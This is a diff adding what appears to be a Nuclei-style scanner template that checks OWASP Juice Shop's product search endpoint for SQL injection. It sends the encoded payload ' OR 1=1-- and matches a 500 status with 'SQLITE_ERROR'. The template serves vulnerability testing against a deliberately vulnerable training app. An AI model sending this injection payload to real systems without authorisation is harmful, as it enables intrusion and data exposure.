@@ -1,0 +1,22 @@
+id: juiceshop-sqli-search-error
+
+info:
+  name: OWASP Juice Shop SQL injection in product search
+  author: Threshold
+  severity: high
+  description: A SQL injection in product search produces a database error response.
+  tags: juiceshop,sqli,error-disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/rest/products/search?q=%27%20OR%201=1--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "SQLITE_ERROR"
